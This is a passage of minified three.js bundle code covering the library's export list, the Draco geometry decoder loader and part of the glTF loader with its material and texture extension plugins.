h=ho,e.SmoothShading=2,e.Sphere=$e,e.SphereBufferGeometry=il,e.SphereGeometry=il,e.Spherical=fu,e.SphericalHarmonics3=pc,e.SplineCurve=_s,e.SpotLight=nc,e.SpotLightHelper=wu,e.Sprite=no,e.SpriteMaterial=Ha,e.SrcAlphaFactor=204,e.SrcAlphaSaturateFactor=210,e.SrcColorFactor=202,e.StaticCopyUsage=35046,e.StaticDrawUsage=U,e.StaticReadUsage=35045,e.StereoCamera=Pc,e.StreamCopyUsage=35042,e.StreamDrawUsage=35040,e.StreamReadUsage=35041,e.StringKeyframeTrack=Fl,e.SubtractEquation=101,e.SubtractiveBlending=3,e.TOUCH={ROTATE:0,PAN:1,DOLLY_PAN:2,DOLLY_ROTATE:3},e.TangentSpaceNormalMap=0,e.TetrahedronBufferGeometry=al,e.TetrahedronGeometry=al,e.TextGeometry=function(){return new un},e.Texture=pe,e.TextureLoader=Kl,e.TorusBufferGeometry=ol,e.TorusGeometry=ol,e.TorusKnotBufferGeometry=sl,e.TorusKnotGeometry=sl,e.Triangle=It,e.TriangleFanDrawMode=2,e.TriangleStripDrawMode=1,e.TrianglesDrawMode=0,e.TubeBufferGeometry=ll,e.TubeGeometry=ll,e.UVMapping=300,e.Uint16Attribute=function(e,t){return new Xt(e,t)},e.Uint16BufferAttribute=Xt,e.Uint32Attribute=function(e,t){return new Jt(e,t)},e.Uint32BufferAttribute=Jt,e.Uint8Attribute=function(e,t){return new Wt(e,t)},e.Uint8BufferAttribute=Wt,e.Uint8ClampedAttribute=function(e,t){return new Kt(e,t)},e.Uint8ClampedBufferAttribute=Kt,e.Uniform=lu,e.UniformsLib=Yn,e.UniformsUtils=Fn,e.UnsignedByteType=g,e.UnsignedInt248Type=C,e.UnsignedIntType=b,e.UnsignedShort4444Type=1017,e.UnsignedShort5551Type=1018,e.UnsignedShort565Type=1019,e.UnsignedShortType=y,e.VSMShadowMap=3,e.Vector2=re,e.Vector3=ye,e.Vector4=fe,e.VectorKeyframeTrack=Ll,e.Vertex=function(e,t,n){return new ye(e,t,n)},e.VertexColors=2,e.VideoTexture=Ho,e.WebGL1Renderer=Oa,e.WebGLCubeRenderTarget=jn,e.WebGLMultipleRenderTargets=me,e.WebGLMultisampleRenderTarget=ve,e.WebGLRenderTarget=Ae,e.WebGLRenderTargetCube=function(e,t,n){return new jn(e,n)},e.WebGLRenderer=La,e.WebGLUtils=ka,e.WireframeGeometry=cl,e.WireframeHelper=function(e,t){return new Lo(new cl(e.geometry),new So({color:void 0!==t?t:16777215}))},e.WrapAroundEnding=2402,e.XHRLoader=function(e){return new zl(e)},e.ZeroCurvatureEnding=2400,e.ZeroFactor=200,e.ZeroSlopeEnding=2401,e.ZeroStencilOp=0,e.sRGBEncoding=j,Object.defineProperty(e,"__esModule",{value:!0})},"object"===_typeof2(n)&&void 0!==t?i(n):"function"==typeof define&&define.amd?define(["exports"],i):i((r="undefined"!=typeof globalThis?globalThis:r||self).THREE={})},{}],272:[function(e,t,n){var r,i;r=new WeakMap,i=function(e){_inherits2(n,THREE.Loader);var t=_createSuper(n);function n(e){var r;return _classCallCheck2(this,n),(r=t.call(this,e)).decoderPath="",r.decoderConfig={},r.decoderBinary=null,r.decoderPending=null,r.workerLimit=4,r.workerPool=[],r.workerNextTaskID=1,r.workerSourceURL="",r.defaultAttributeIDs={position:"POSITION",normal:"NORMAL",color:"COLOR",uv:"TEX_COORD"},r.defaultAttributeTypes={position:"Float32Array",normal:"Float32Array",color:"Float32Array",uv:"Float32Array"},r}return _createClass2(n,[{key:"setDecoderPath",value:function(e){return this.decoderPath=e,this}},{key:"setDecoderConfig",value:function(e){return this.decoderConfig=e,this}},{key:"setWorkerLimit",value:function(e){return this.workerLimit=e,this}},{key:"load",value:function(e,t,n,r){var i=this,a=new THREE.FileLoader(this.manager);a.setPath(this.path),a.setResponseType("arraybuffer"),a.setRequestHeader(this.requestHeader),a.setWithCredentials(this.withCredentials),a.load(e,(function(e){var n={attributeIDs:i.defaultAttributeIDs,attributeTypes:i.defaultAttributeTypes,useUniqueIDs:!1};i.decodeGeometry(e,n).then(t).catch(r)}),n,r)}},{key:"decodeDracoFile",value:function(e,t,n,r){var i={attributeIDs:n||this.defaultAttributeIDs,attributeTypes:r||this.defaultAttributeTypes,useUniqueIDs:!!n};this.decodeGeometry(e,i).then(t)}},{key:"decodeGeometry",value:function(e,t){var n=this;for(var i in t.attributeTypes){var a=t.attributeTypes[i];void 0!==a.BYTES_PER_ELEMENT&&(t.attributeTypes[i]=a.name)}var o,s=JSON.stringify(t);if(r.has(e)){var l=r.get(e);if(l.key===s)return l.promise;if(0===e.byteLength)throw new Error("THREE.DRACOLoader: Unable to re-decode a buffer with different settings. Buffer has already been transferred.")}var c=this.workerNextTaskID++,u=e.byteLength,d=this._getWorker(c,u).then((function(n){return o=n,new Promise((function(n,r){o._callbacks[c]={resolve:n,reject:r},o.postMessage({type:"decode",id:c,taskConfig:t,buffer:e},[e])}))})).then((function(e){return n._createGeometry(e.geometry)}));return d.catch((function(){return!0})).then((function(){o&&c&&n._releaseTask(o,c)})),r.set(e,{key:s,promise:d}),d}},{key:"_createGeometry",value:function(e){var t=new THREE.BufferGeometry;e.index&&t.setIndex(new THREE.BufferAttribute(e.index.array,1));for(var n=0;n<e.attributes.length;n++){var r=e.attributes[n],i=r.name,a=r.array,o=r.itemSize;t.setAttribute(i,new THREE.BufferAttribute(a,o))}return t}},{key:"_loadLibrary",value:function(e,t){var n=new THREE.FileLoader(this.manager);return n.setPath(this.decoderPath),n.setResponseType(t),n.setWithCredentials(this.withCredentials),new Promise((function(t,r){n.load(e,t,void 0,r)}))}},{key:"preload",value:function(){return this._initDecoder(),this}},{key:"_initDecoder",value:function(){var e=this;if(this.decoderPending)return this.decoderPending;var t="object"!==("undefined"==typeof WebAssembly?"undefined":_typeof2(WebAssembly))||"js"===this.decoderConfig.type,n=[];return t?n.push(this._loadLibrary("draco_decoder.js","text")):(n.push(this._loadLibrary("draco_wasm_wrapper.js","text")),n.push(this._loadLibrary("draco_decoder.wasm","arraybuffer"))),this.decoderPending=Promise.all(n).then((function(n){var r=n[0];t||(e.decoderConfig.wasmBinary=n[1]);var i=function(){var e,t;function n(e,t,n,r,i,a){var o=a.num_components(),s=n.num_points()*o,l=s*i.BYTES_PER_ELEMENT,c=function(e,t){switch(t){case Float32Array:return e.DT_FLOAT32;case Int8Array:return e.DT_INT8;case Int16Array:return e.DT_INT16;case Int32Array:return e.DT_INT32;case Uint8Array:return e.DT_UINT8;case Uint16Array:return e.DT_UINT16;case Uint32Array:return e.DT_UINT32}}(e,i),u=e._malloc(l);t.GetAttributeDataArrayForAllPoints(n,a,c,l,u);var d=new i(e.HEAPF32.buffer,u,s).slice();return e._free(u),{name:r,array:d,itemSize:o}}onmessage=function(r){var i=r.data;switch(i.type){case"init":e=i.decoderConfig,t=new Promise((function(t){e.onModuleLoaded=function(e){t({draco:e})},DracoDecoderModule(e)}));break;case"decode":var a=i.buffer,o=i.taskConfig;t.then((function(e){var t=e.draco,r=new t.Decoder,s=new t.DecoderBuffer;s.Init(new Int8Array(a),a.byteLength);try{var l=function(e,t,r,i){var a,o,s=i.attributeIDs,l=i.attributeTypes,c=t.GetEncodedGeometryType(r);if(c===e.TRIANGULAR_MESH)a=new e.Mesh,o=t.DecodeBufferToMesh(r,a);else{if(c!==e.POINT_CLOUD)throw new Error("THREE.DRACOLoader: Unexpected geometry type.");a=new e.PointCloud,o=t.DecodeBufferToPointCloud(r,a)}if(!o.ok()||0===a.ptr)throw new Error("THREE.DRACOLoader: Decoding failed: "+o.error_msg());var u={index:null,attributes:[]};for(var d in s){var p=self[l[d]],h=void 0,f=void 0;if(i.useUniqueIDs)f=s[d],h=t.GetAttributeByUniqueId(a,f);else{if(-1===(f=t.GetAttributeId(a,e[s[d]])))continue;h=t.GetAttribute(a,f)}u.attributes.push(n(e,t,a,d,p,h))}return c===e.TRIANGULAR_MESH&&(u.index=function(e,t,n){var r=3*n.num_faces(),i=4*r,a=e._malloc(i);t.GetTrianglesUInt32Array(n,i,a);var o=new Uint32Array(e.HEAPF32.buffer,a,r).slice();return e._free(a),{array:o,itemSize:1}}(e,t,a)),e.destroy(a),u}(t,r,s,o),c=l.attributes.map((function(e){return e.array.buffer}));l.index&&c.push(l.index.array.buffer),self.postMessage({type:"decode",id:i.id,geometry:l},c)}catch(e){self.postMessage({type:"error",id:i.id,error:e.message})}finally{t.destroy(s),t.destroy(r)}}))}}}.toString(),a=["/* draco decoder */",r,"","/* worker */",i.substring(i.indexOf("{")+1,i.lastIndexOf("}"))].join("\n");e.workerSourceURL=URL.createObjectURL(new Blob([a]))})),this.decoderPending}},{key:"_getWorker",value:function(e,t){var n=this;return this._initDecoder().then((function(){if(n.workerPool.length<n.workerLimit){var r=new Worker(n.workerSourceURL);r._callbacks={},r._taskCosts={},r._taskLoad=0,r.postMessage({type:"init",decoderConfig:n.decoderConfig}),r.onmessage=function(e){var t=e.data;switch(t.type){case"decode":r._callbacks[t.id].resolve(t);break;case"error":r._callbacks[t.id].reject(t)}},n.workerPool.push(r)}else n.workerPool.sort((function(e,t){return e._taskLoad>t._taskLoad?-1:1}));var i=n.workerPool[n.workerPool.length-1];return i._taskCosts[e]=t,i._taskLoad+=t,i}))}},{key:"_releaseTask",value:function(e,t){e._taskLoad-=e._taskCosts[t],delete e._callbacks[t],delete e._taskCosts[t]}},{key:"debug",value:function(){}},{key:"dispose",value:function(){for(var e=0;e<this.workerPool.length;++e)this.workerPool[e].terminate();return this.workerPool.length=0,this}}]),n}(),THREE.DRACOLoader=i},{}],273:[function(e,t,n){!function(){var e=function(e){_inherits2(g,THREE.Loader);var t=_createSuper(g);function g(e){var n;return _classCallCheck2(this,g),(n=t.call(this,e)).dracoLoader=null,n.ktx2Loader=null,n.meshoptDecoder=null,n.pluginCallbacks=[],n.register((function(e){return new a(e)})),n.register((function(e){return new d(e)})),n.register((function(e){return new p(e)})),n.register((function(e){return new o(e)})),n.register((function(e){return new s(e)})),n.register((function(e){return new l(e)})),n.register((function(e){return new c(e)})),n.register((function(e){return new u(e)})),n.register((function(e){return new r(e)})),n.register((function(e){return new h(e)})),n}return _createClass2(g,[{key:"load",value:function(e,t,n,r){var i,a=this;i=""!==this.resourcePath?this.resourcePath:""!==this.path?this.path:THREE.LoaderUtils.extractUrlBase(e),this.manager.itemStart(e);var o=function(t){r&&r(t),a.manager.itemError(e),a.manager.itemEnd(e)},s=new THREE.FileLoader(this.manager);s.setPath(this.path),s.setResponseType("arraybuffer"),s.setRequestHeader(this.requestHeader),s.setWithCredentials(this.withCredentials),s.load(e,(function(n){try{a.parse(n,i,(function(n){t(n),a.manager.itemEnd(e)}),o)}catch(n){o(n)}}),n,o)}},{key:"setDRACOLoader",value:function(e){return this.dracoLoader=e,this}},{key:"setDDSLoader",value:function(){throw new Error('THREE.GLTFLoader: "MSFT_texture_dds" no longer supported. Please update to "KHR_texture_basisu".')}},{key:"setKTX2Loader",value:function(e){return this.ktx2Loader=e,this}},{key:"setMeshoptDecoder",value:function(e){return this.meshoptDecoder=e,this}},{key:"register",value:function(e){return-1===this.pluginCallbacks.indexOf(e)&&this.pluginCallbacks.push(e),this}},{key:"unregister",value:function(e){return-1!==this.pluginCallbacks.indexOf(e)&&this.pluginCallbacks.splice(this.pluginCallbacks.indexOf(e),1),this}},{key:"parse",value:function(e,t,r,a){var o,s={},l={};if("string"==typeof e)o=e;else if(THREE.LoaderUtils.decodeText(new Uint8Array(e,0,4))===f){try{s[n.KHR_BINARY_GLTF]=new A(e)}catch(e){return void(a&&a(e))}o=s[n.KHR_BINARY_GLTF].content}else o=THREE.LoaderUtils.decodeText(new Uint8Array(e));var c=JSON.parse(o);if(void 0===c.asset||c.asset.version[0]<2)a&&a(new Error("THREE.GLTFLoader: Unsupported asset. glTF versions >=2.0 are supported."));else{var u=new N(c,{path:t||this.resourcePath||"",crossOrigin:this.crossOrigin,requestHeader:this.requestHeader,manager:this.manager,ktx2Loader:this.ktx2Loader,meshoptDecoder:this.meshoptDecoder});u.fileLoader.setRequestHeader(this.requestHeader);for(var d=0;d<this.pluginCallbacks.length;d++){var p=this.pluginCallbacks[d](u);s[(l[p.name]=p).name]=!0}if(c.extensionsUsed)for(var h=0;h<c.extensionsUsed.length;++h){var g=c.extensionsUsed[h],_=c.extensionsRequired||[];switch(g){case n.KHR_MATERIALS_UNLIT:s[g]=new i;break;case n.KHR_MATERIALS_PBR_SPECULAR_GLOSSINESS:s[g]=new y;break;case n.KHR_DRACO_MESH_COMPRESSION:s[g]=new m(c,this.dracoLoader);break;case n.KHR_TEXTURE_TRANSFORM:s[g]=new v;break;case n.KHR_MESH_QUANTIZATION:s[g]=new b;break;default:0<=_.indexOf(g)&&l[g]}}u.setExtensions(s),u.setPlugins(l),u.parse(r,a)}}},{key:"parseAsync",value:function(e,t){var n=this;return new Promise((function(r,i){n.parse(e,t,r,i)}))}}]),g}();function t(){var e={};return{get:function(t){return e[t]},add:function(t,n){e[t]=n},remove:function(t){delete e[t]},removeAll:function(){e={}}}}var n={KHR_BINARY_GLTF:"KHR_binary_glTF",KHR_DRACO_MESH_COMPRESSION:"KHR_draco_mesh_compression",KHR_LIGHTS_PUNCTUAL:"KHR_lights_punctual",KHR_MATERIALS_CLEARCOAT:"KHR_materials_clearcoat",KHR_MATERIALS_IOR:"KHR_materials_ior",KHR_MATERIALS_PBR_SPECULAR_GLOSSINESS:"KHR_materials_pbrSpecularGlossiness",KHR_MATERIALS_SHEEN:"KHR_materials_sheen",KHR_MATERIALS_SPECULAR:"KHR_materials_specular",KHR_MATERIALS_TRANSMISSION:"KHR_materials_transmission",KHR_MATERIALS_UNLIT:"KHR_materials_unlit",KHR_MATERIALS_VOLUME:"KHR_materials_volume",KHR_TEXTURE_BASISU:"KHR_texture_basisu",KHR_TEXTURE_TRANSFORM:"KHR_texture_transform",KHR_MESH_QUANTIZATION:"KHR_mesh_quantization",EXT_TEXTURE_WEBP:"EXT_texture_webp",EXT_MESHOPT_COMPRESSION:"EXT_meshopt_compression"},r=function(){function e(t){_classCallCheck2(this,e),this.parser=t,this.name=n.KHR_LIGHTS_PUNCTUAL,this.cache={refs:{},uses:{}}}return _createClass2(e,[{key:"_markDefs",value:function(){for(var e=this.parser,t=this.parser.json.nodes||[],n=0,r=t.length;n<r;n++){var i=t[n];i.extensions&&i.extensions[this.name]&&void 0!==i.extensions[this.name].light&&e._addNodeRef(this.cache,i.extensions[this.name].light)}}},{key:"_loadLight",value:function(e){var t=this.parser,n="light:"+e,r=t.cache.get(n);if(r)return r;var i,a=t.json,o=((a.extensions&&a.extensions[this.name]||{}).lights||[])[e],s=new THREE.Color(16777215);void 0!==o.color&&s.fromArray(o.color);var l=void 0!==o.range?o.range:0;switch(o.type){case"directional":(i=new THREE.DirectionalLight(s)).target.position.set(0,0,-1),i.add(i.target);break;case"point":(i=new THREE.PointLight(s)).distance=l;break;case"spot":(i=new THREE.SpotLight(s)).distance=l,o.spot=o.spot||{},o.spot.innerConeAngle=void 0!==o.spot.innerConeAngle?o.spot.innerConeAngle:0,o.spot.outerConeAngle=void 0!==o.spot.outerConeAngle?o.spot.outerConeAngle:Math.PI/4,i.angle=o.spot.outerConeAngle,i.penumbra=1-o.spot.innerConeAngle/o.spot.outerConeAngle,i.target.position.set(0,0,-1),i.add(i.target);break;default:throw new Error("THREE.GLTFLoader: Unexpected light type: "+o.type)}return i.position.set(0,0,0),i.decay=2,void 0!==o.intensity&&(i.intensity=o.intensity),i.name=t.createUniqueName(o.name||"light_"+e),r=Promise.resolve(i),t.cache.add(n,r),r}},{key:"createNodeAttachment",value:function(e){var t=this,n=this.parser,r=n.json.nodes[e],i=(r.extensions&&r.extensions[this.name]||{}).light;return void 0===i?null:this._loadLight(i).then((function(e){return n._getNodeRef(t.cache,i,e)}))}}]),e}(),i=function(){function e(){_classCallCheck2(this,e),this.name=n.KHR_MATERIALS_UNLIT}return _createClass2(e,[{key:"getMaterialType",value:function(){return THREE.MeshBasicMaterial}},{key:"extendParams",value:function(e,t,n){var r=[];e.color=new THREE.Color(1,1,1),e.opacity=1;var i=t.pbrMetallicRoughness;if(i){if(Array.isArray(i.baseColorFactor)){var a=i.baseColorFactor;e.color.fromArray(a),e.opacity=a[3]}void 0!==i.baseColorTexture&&r.push(n.assignTexture(e,"map",i.baseColorTexture))}return Promise.all(r)}}]),e}(),a=function(){function e(t){_classCallCheck2(this,e),this.parser=t,this.name=n.KHR_MATERIALS_CLEARCOAT}return _createClass2(e,[{key:"getMaterialType",value:function(e){var t=this.parser.json.materials[e];return t.extensions&&t.extensions[this.name]?THREE.MeshPhysicalMaterial:null}},{key:"extendMaterialParams",value:function(e,t){var n=this.parser,r=n.json.materials[e];if(!r.extensions||!r.extensions[this.name])return Promise.resolve();var i=[],a=r.extensions[this.name];if(void 0!==a.clearcoatFactor&&(t.clearcoat=a.clearcoatFactor),void 0!==a.clearcoatTexture&&i.push(n.assignTexture(t,"clearcoatMap",a.clearcoatTexture)),void 0!==a.clearcoatRoughnessFactor&&(t.clearcoatRoughness=a.clearcoatRoughnessFactor),void 0!==a.clearcoatRoughnessTexture&&i.push(n.assignTexture(t,"clearcoatRoughnessMap",a.clearcoatRoughnessTexture)),void 0!==a.clearcoatNormalTexture&&(i.push(n.assignTexture(t,"clearcoatNormalMap",a.clearcoatNormalTexture)),void 0!==a.clearcoatNormalTexture.scale)){var o=a.clearcoatNormalTexture.scale;t.clearcoatNormalScale=new THREE.Vector2(o,o)}return Promise.all(i)}}]),e}(),o=function(){function e(t){_classCallCheck2(this,e),this.parser=t,this.name=n.KHR_MATERIALS_SHEEN}return _createClass2(e,[{key:"getMaterialType",value:function(e){var t=this.parser.json.materials[e];return t.extensions&&t.extensions[this.name]?THREE.MeshPhysicalMaterial:null}},{key:"extendMaterialParams",value:function(e,t){var n=this.parser,r=n.json.materials[e];if(!r.extensions||!r.extensions[this.name])return Promise.resolve();var i=[];t.sheenColor=new THREE.Color(0,0,0),t.sheenRoughness=0,t.sheen=1;var a=r.extensions[this.name];return void 0!==a.sheenColorFactor&&t.sheenColor.fromArray(a.sheenColorFactor),void 0!==a.sheenRoughnessFactor&&(t.sheenRoughness=a.sheenRoughnessFactor),void 0!==a.sheenColorTexture&&i.push(n.assignTexture(t,"sheenColorMap",a.sheenColorTexture)),void 0!==a.sheenRoughnessTexture&&i.push(n.assignTexture(t,"sheenRoughnessMap",a.sheenRoughnessTexture)),Promise.all(i)}}]),e}(),s=function(){function e(t){_classCallCheck2(this,e),this.parser=t,this.name=n.KHR_MATERIALS_TRANSMISSION}return _createClass2(e,[{key:"getMaterialType",value:function(e){var t=this.parser.json.materials[e];return t.extensions&&t.extensions[this.name]?THREE.MeshPhysicalMaterial:null}},{key:"extendMaterialParams",value:function(e,t){var n=this.parser,r=n.json.materials[e];if(!r.extensions||!r.extensions[this.name])return Promise.resolve();var i=[],a=r.extensions[this.name];return void 0!==a.transmissionFactor&&(t.transmission=a.transmissionFactor),void 0!==a.transmissionTexture&&i.push(n.assignTexture(t,"transmissionMap",a.transmissionTexture)),Promise.all(i)}}]),e}(),l=function(){function e(t){_classCallCheck2(this,e),this.parser=t,this.name=n.KHR_MATERIALS_VOLUME}return _createClass2(e,[{key:"getMaterialType",value:function(e){var t=this.parser.json.materials[e];return t.extensions&&t.extensions[this.name]?THREE.MeshPhysicalMaterial:null}},{key:"extendMaterialParams",value:function(e,t){var n=this.parser,r=n.json.materials[e];if(!r.extensions||!r.extensions[this.name])return Promise.resolve();var i=[],a=r.extensions[this.name];t.thickness=void 0!==a.thicknessFactor?a.thicknessFactor:0,void 0!==a.thicknessTexture&&i.push(n.assignTexture(t,"thicknessMap",a.thicknessTexture)),t.attenuationDistance=a.attenuationDistance||0;var o=a.attenuationColor||[1,1,1];return t.attenuationColor=new THREE.Color(o[0],o[1],o[2]),Promise.all(i)}}]),e}(),c=function(){function e(t){_classCallCheck2(this,e),this.parser=t,this.name=n.KHR_MATERIALS_IOR}return _createClass2(e,[{key:"getMaterialType",value:function(e){var t=this.parser.json.materials[e];return t.extensions&&t.extensions[this.name]?THREE.MeshPhysicalMaterial:null}},{key:"extendMaterialParams",value:function(e,t){var n=this.parser.json.materials[e];if(!n.extensions||!n.extensions[this.name])return Promise.resolve();var r=n.extensions[this.name];return t.ior=void 0!==r.ior?r.ior:1.5,Promise.resolve()}}]),e}(),u=function(){function e(t){_classCallCheck2(this,e),this.parser=t,this.name=n.KHR_MATERIALS_SPECULAR}return _createClass2(e,[{key:"getMaterialType",value:function(e){var t=this.parser.json.materials[e];return t.extensions&&t.extensions[this.name]?THREE.MeshPhysicalMaterial:null}},{key:"extendMaterialParams",value:function(e,t){var n=this.parser,r=n.json.materials[e];if(!r.extensions||!r.extensions[this.name])return Promise.resolve();var i=[],a=r.extensions[this.name];t.specularIntensity=void 0!==a.specularFactor?a.specularFactor:1,void 0!==a.specularTexture&&i.push(n.assignTexture(t,"specularIntensityMap",a.specularTexture));var o=a.specularColorFactor||[1,1,1];return t.specularColor=new THREE.Color(o[0],o[1],o[2]),void 0!==a.specularColorTexture&&i.push(n.assignTexture(t,"specularColorMap",a.specularColorTexture).then((function(e){e.encoding=THREE.sRGBEncoding}))),Promise.all(i)}}]),e}(),d=function(){function e(t){_classCallCheck2(this,e),this.parser=t,this.name=n.KHR_TEXTURE_BASISU}return _createClass2(e,[{key:"loadTexture",value:function(e){var t=this.parser,n=t.json,r=n.textures[e];if(!r.extensions||!r.extensions[this.name])return null;var i=r.extensions[this.name],a=n.images[i.source],o=t.options.ktx2Loader;if(o)return t.loadTextureImage(e,a,o);if(n.extensionsRequired&&0<=n.extensionsRequired.indexOf(this.name))throw new Error("THREE.GLTFLoader: setKTX2Loader must be called before loading KTX2 textures");return null}}]),e}(),p=function(){function e(t){_classCallCheck2(this,e),this.parser=t,this.name=n.EXT_TEXTURE_WEBP,this.isSupported=null}return _createClass2(e,[{key:"loadTexture",value:function(e){var t=this.name,n=this.parser,r=n.json,i=r.textures[e];if(!i.extensions||!i.extensions[t])return null;var a=i.extensions[t],o=r.images[a.source],s=n.textureLoader;if(o.uri){var l=n.options.manager.getHandler(o.uri);null!==l&&(s=l)}return this.detectSupport().then((function(i){if(i)return n.loadTextureImage(e,o,s);if(r.extensionsRequired&&0<=r.extensionsRequired.indexOf(t))throw new Error("THREE.GLTFLoader: WebP required by asset but unsupported.");return n.loadTexture(e)}))}},{key:"detectSupport",value:function(){return this.isSupported||(this.isSupported=new Promise((function(e){var t=new Image;t.src="data:image/webp;base64,UklGRiIAAABXRUJQVlA4IBYAAAAwAQCdASoBAAEADsD+JaQAA3AAAAAA",t.onload=t.onerror=function(){e(1===t.height)}}))),this.isSupported}}]),e}(),h=function(){function e(t){_classCallCheck2(this,e),this.name=n.EXT_MESHOPT_COMPRESSION,this.parser=t}return _createClass2(e,[{key:"loadBufferView",value:function(e){var t=this.parser.json,n=t.bufferViews[e];if(n.extensions&&n.extensions[this.name]){var r=n.extensions[this.name],i=this.parser.getDependency("buffer",r.buffer),a=this.parser.options.meshoptDecoder;if(a&&a.supported)return Promise.all([i,a.ready]).then((function(e){var t=r.byteOffset||0,n=r.byteLength||0,i=r.count,o=r.byteStride,s=new ArrayBuffer(i*o),l=new Uint8Array(e[0],t,n);return a.decodeGltfBuffer(new Uint8Array(s),i,o,l,r.mode,r.filter),s}));if(t.extensionsRequired&&0<=t.extensionsRequired.indexOf(this.name))throw new Error("THREE.GLTFLoader: setMeshoptDecoder must be called before loading compressed files");return null}return null}}]),e}(),f="glTF",A=function e(t){_classCallCheck2(this,e),this.name=n.KHR_BINARY_GLTF,this.content=null,this.body=null;var r=new DataView(t,0,12);if(this.header={magic:THREE.LoaderUtils.decodeText(new Uint8Array(t.slice(0,4))),version:r.getUint32(4,!0),length:r.getUint32(8,!0)},this.header.magic!==f)throw new Error("THREE.GLTFLoader: Unsupported glTF-Binary header.");if(this.header.version<2)throw new Error("THREE.GLTFLoader: Legacy binary file detected.");for(var i=this.header.length-12,a=new DataView(t,12),o=0;o<i;){var s=a.getUint32(o,!0);o+=4;var l=a.getUint32(o,!0);if(o+=4,1313821514===l){var c=new Uint8Array(t,12+o,s);this.content=THREE.LoaderUtils.decodeText(c)}else if(5130562===l){var u=12+o;this.body=t.slice(u,u+s)}o+=s}if(null===this.content)throw new Error("THREE.GLTFLoader: JSON content not found.")},m=function(){function e(t,r){if(_classCallCheck2(this,e),!r)throw new Error("THREE.GLTFLoader: No DRACOLoader instance provided.");this.name=n.KHR_DRACO_MESH_COMPRESSION,this.json=t,this.dracoLoader=r,this.dracoLoader.preload()}return _createClass2(e,[{key:"decodePrimitive",value:function(e,t){var n=this.json,r=this.dracoLoader,i=e.extensions[this.name].bufferView,a=e.extensions[this.name].attributes,o={},s={},l={};for(var c in a){var u=B[c]||c.toLowerCase();o[u]=a[c]}for(var d in e.attributes){var p=B[d]||d.toLowerCase();if(void 0!==a[d]){var h=n.accessors[e.attributes[d]],f=x[h.componentType];l[p]=f,s[p]=!0===h.normalized}}return t.getDependency("bufferView",i).then((function(e){return new Promise((function(t){r.decodeDracoFile(e,(function(e){for(var n in e.attributes){var r=e.attributes[n],i=s[n];void 0!==i&&(r.normalized=i)}t(e)}),o,l)}))}))}}]),e}(),v=function(){function e(){_classCallCheck2(this,e),this.name=n.KHR_TEXTURE_TRANSFORM}return _createClass2(e,[{key:"extendTexture",value:function(e,t){return t.texCoord,void 0===t.offset&&void 0===t.rotation&&void 0===t.scale||(e=e.clone(),void 0!==t.offset&&e.offset.fromArray(t.offset),void 0!==t.rotation&&(e.rotation=t.rotation),void 0!==t.scale&&e.repeat.fromArray(t.scale),e.needsUpdate=!0),e}}]),e}(),g=function(e){_inherits2(n,THREE.MeshStandardMaterial);var t=_createSuper(n);function n(e){var r;_classCallCheck2(this,n),(r=t.call(this)).isGLTFSpecularGlossinessMaterial=!0;var i=["#ifdef USE_SPECULARMAP","\tuniform sampler2D specularMap;","#endif"].join("\n"),a=["#ifdef USE_GLOSSINESSMAP","\tuniform sampler2D glossinessMap;","#endif"].join("\n"),o=["vec3 specularFactor = specular;","#ifdef USE_SPECULARMAP","\tvec4 texelSpecular = texture2D( specularMap, vUv );","\ttexelSpecular = sRGBToLinear( texelSpecular );","\t// reads channel RGB, compatible with a glTF Specular-Glossiness (RGBA) texture","\tspecularFactor *= texelSpecular.rgb;","#endif"].join("\n"),s=["float glossinessFactor = glossiness;","#ifdef USE_GLOSSINESSMAP","\tvec4 texelGlossiness = texture2D( glossinessMap, vUv );","\t// reads channel A, compatible with a glTF Specular-Glossiness (RGBA) texture","\tglossinessFactor *= texelGlossiness.a;","#endif"].join("\n"),l=["PhysicalMaterial material;","material.diffuseColor = diffuseColor.rgb * ( 1. - max( specularFactor.r, max( specularFactor.g, specularFactor.b ) ) );","vec3 dxy = max( abs( dFdx( geometryNormal ) ), abs( dFdy( geometryNormal ) ) );","float geometryRoughness = max( max( dxy.x, dxy.y ), dxy.z );","material.roughness = max( 1.0 - glossinessFactor, 0.0525 ); // 0.0525 corresponds to the base mip of a 256 cubemap.","material.roughness += geometryRoughness;","material.roughness = min( material.roughness, 1.0 );","material.specularColor = specularFactor;"].join("\n"),c={specular:{value:(new THREE.Color).setHex(16777215)},glossiness:{value:1},specularMap:{value:null},glossinessMap:{value:null}};return r._extraUniforms=c,r.onBeforeCompile=function(e){for(var t in c)e.uniforms[t]=c[t];e.fragmentShader=e.fragmentShader.replace("uniform float roughness;","uniform vec3 specular;").replace("uniform float metalness;","uniform float glossiness;").replace("#include <roughnessmap_pars_fragment>",i).replace("#include <metalnessmap_pars_fragment>",a).replace("#include <roughnessmap_fragment>",o).replace("#include <metalnessmap_fragment>",s).replace("#include <lights_physical_fragment>",l)},Object.defineProperties(_assertThisInitialized2(r),{specular:{get:function(){return c.specular.value},set:function(e){c.specular.value=e}},specularMap:{get:function(){return c.specularMap.value},set:function(e){(c.specularMap.value=e)?this.defines.USE_SPECULARMAP="":delete this.defines.USE_SPECULARMAP}},glossiness:{get:function(){return c.glossiness.value},set:function(e){c.glossiness.value=e}},glossinessMap:{get:function(){return c.glossinessMap.value},set:function(e){(c.glossinessMap.value=e)?(this.defines.USE_GLOSSINESSMAP="",this.defines.USE_UV=""):(delete this.defines.USE_GLOSSINESSMAP,delete this.defines.USE_UV)}}}),delete r.metalness,delete r.roughness,delete r.metalnessMap,delete r.roughnessMap,r.setValues(e),r}return _createClass2(n,[{key:"copy",value:function(e){return _get2(_getPrototypeOf(n.prototype),"copy",this).call(this,e),this.specularMap=e.specularMap,this.specular.copy(e.specular),this.glossinessMap=e.glossinessMap,this.glossiness=e.glossiness,delete this.metalness,delete this.roughness,delete this.metalnessMap,delete this.roughnessMap,this}}]),n}(),y=function(){function e(){_classCallCheck2(this,e),this.name=n.KHR_MATERIALS_PBR_SPECULAR_GLOSSINESS,this.specularGlossinessParams=["color","map","lightMap","lightMapIntensity","aoMap","aoMapIntensity","emissive","emissiveIntensity","emissiveMap","bumpMap","bumpScale","normalMap","normalMapType","displacementMap","displacementScale","displacementBias","specularMap","specular","glossinessMap","glossiness","alphaMap","envMap","envMapIntensity","refractionRatio"]}return _createClass2(e,[{key:"getMaterialType",value:function(){return g}},{key:"extendParams",value:function(e,t,n){var r=t.extensions[this.name];e.color=new THREE.Color(1,1,1),e.opacity=1;var i=[];if(Array.isArray(r.diffuseFactor)){var a=r.diffuseFactor;e.color.fromArray(a),e.opacity=a[3]}if(void 0!==r.diffuseTexture&&i.push(n.assignTexture(e,"map",r.diffuseTexture)),e.emissive=new THREE.Color(0,0,0),e.glossiness=void 